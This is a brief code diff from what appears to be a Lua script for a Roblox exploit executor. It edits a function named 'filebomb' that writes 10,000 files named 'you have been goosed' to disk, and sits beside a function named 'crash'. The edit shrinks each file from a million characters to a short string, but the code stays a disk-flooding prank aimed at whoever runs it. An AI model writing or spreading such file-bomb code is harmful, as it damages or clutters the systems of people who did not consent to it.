@@ -37,9 +37,9 @@ local function crash()
 end
 
 local function filebomb()
-	local text = ("w"):rep(1000000)
 	for i = 1, 10000 do
-		writefile("you have been goosed"..i..".txt", text)
+		writefile("you have been goosed "..i..".txt", "hey")
+		task.wait()
 	end
 end
 
